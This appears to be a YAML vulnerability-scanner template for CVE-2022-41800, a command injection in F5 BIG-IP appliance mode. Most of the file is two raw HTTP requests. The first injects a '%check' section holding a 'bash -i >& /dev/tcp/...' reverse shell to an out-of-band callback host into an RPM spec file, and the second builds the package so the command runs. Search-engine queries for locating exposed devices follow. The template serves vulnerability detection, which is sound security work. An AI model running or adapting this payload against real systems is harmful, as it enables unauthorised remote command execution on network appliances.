http:
- extractors:
  - internal: true
    json:
    - .specFilePath
    name: spec
    part: body
    type: json
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - RUN_BUILD_RPM_TASK
    - shared:iapp:build-package:buildrpmtaskstate
  matchers-condition: and
  raw:
  - "POST /mgmt/shared/iapp/rpm-spec-creator HTTP/1.1\nHost: {{Hostname}}\nX-F5-Auth-Token:\
    \ {{to_lower(rand_text_alpha(1))}}\nAuthorization: Basic {{base64(auth)}}\nContent-Type:\
    \ application/json\nConnection: keep-alive, X-F5-Auth-Token, X-Forwarded-Host\n\
    \n{\n  \"specFileData\": {\n    \"name\": \"{{rand_app}}\",\n    \"srcBasePath\"\
    : \"/tmp\",\n    \"version\": \"{{rand_ver}}\",\n    \"release\": \"{{rand_rel}}\"\
    ,\n    \"description\": \"\\n\\n%check\\nbash -i >& /dev/tcp/{{interactsh-url}}/{{rand_text_numeric(4)}}\
    \ 0>&1\",\n    \"summary\": \"{{to_lower(rand_text_alphanumeric(10))}}\"\n  }\n\
    }\n"
  - "POST /mgmt/shared/iapp/build-package HTTP/1.1\nHost: {{Hostname}}\nX-F5-Auth-Token:\
    \ {{to_lower(rand_text_alpha(1))}}\nAuthorization: Basic {{base64(auth)}}\nContent-Type:\
    \ application/json\nConnection: keep-alive, X-F5-Auth-Token, X-Forwarded-Host\n\
    \n{\n  \"state\": {},\n  \"appName\": \"{{rand_app}}\",\n  \"packageDirectory\"\
    : \"/tmp\",\n  \"specFilePath\": \"{{spec}}\",\n  \"force\": true\n}\n"
id: CVE-2022-41800
info:
  author: dwisiswant0
  classification:
    cpe: cpe:2.3:a:f5:big-ip_access_policy_manager:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-41800
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:N
    cvss-score: 8.7
    cwe-id: CWE-77
    epss-percentile: 0.99738
    epss-score: 0.92701
  description: 'When running in Appliance mode, an authenticated user assigned the
    Administrator role may bypass Appliance mode restrictions, utilizing an undisclosed
    iControl REST endpoint.

    '
  impact: 'A successful exploit can allow the attacker to execute remote commands
    on server using authorization bypass (CVE-2022-1388).

    '
  metadata:
    fofa-query:
    - body="big-ip apm"
    - title="big-ip&reg;-+redirect" +"server"
    google-query: intitle:"big-ip&reg;-+redirect" +"server"
    max-request: 2
    product: big-ip_access_policy_manager
    shodan-query:
    - http.title:"big-ip&reg;-+redirect" +"server"
    - http.html:"big-ip apm"
    vendor: f5
    verified: true
  name: F5 BIG-IP Appliance Mode - Command Injection
  reference:
  - https://attackerkb.com/topics/ZClTQn4aG4/cve-2022-41800/rapid7-analysis
  - https://support.f5.com/csp/article/K97843387
  - https://support.f5.com/csp/article/K13325942
  - https://www.horizon3.ai/f5-icontrol-rest-endpoint-authentication-bypass-technical-deep-dive/
  - https://nvd.nist.gov/vuln/detail/cve-2022-41800
  remediation: 'Apply security patches from F5 Networks as outlined in K97843387 and
    ensure Appliance mode restrictions are properly enforced.

    '
  severity: high
  tags: cve,cve2022,rce,f5,bigip,instrusive,vkev,vuln
variables:
  auth: admin:{{rand_text_alpha(1)}}
  rand_app: '{{to_lower(rand_text_alpha(6))}}'
  rand_rel: '{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}'
  rand_ver: '{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}.{{rand_text_numeric(1)}}'
